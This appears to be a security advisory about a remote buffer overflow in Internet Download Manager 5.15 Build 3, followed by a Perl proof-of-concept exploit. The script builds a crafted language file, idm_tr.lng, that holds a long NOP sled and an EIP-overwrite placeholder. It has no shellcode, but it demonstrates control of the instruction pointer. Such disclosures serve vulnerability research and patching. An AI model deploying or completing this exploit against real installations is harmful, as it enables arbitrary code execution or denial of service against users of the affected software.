source: http://www.securityfocus.com/bid/33934/info

Internet Download Manager (IDM) is prone to a remote buffer-overflow vulnerability because the application fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer.

An attacker may exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

This issue affects IDM 5.15 Build 3; other versions may also be vulnerable.

#Internet Download Manager v.5.15 Build 3 (4 December)
#Works on Vista
#HellCode Labs || TCC Group || http://tcc.hellcode.net
#Bug was found by "musashi" aka karak0rsan
[musashi@hellcode.net]
#thanx to murderkey
$file="idm_tr.lng";
$lng= "lang=0x1f T�rk�e";
$buffer = "\x90" x 1160;
$eip = "AAAA";
$toolbar = "20376=";
$packet=$toolbar.$buffer.$eip;
open(file, '>' . $file);
print file $lng;
print file "\n";
print file $packet;
close(file);
print "File has created!\n";
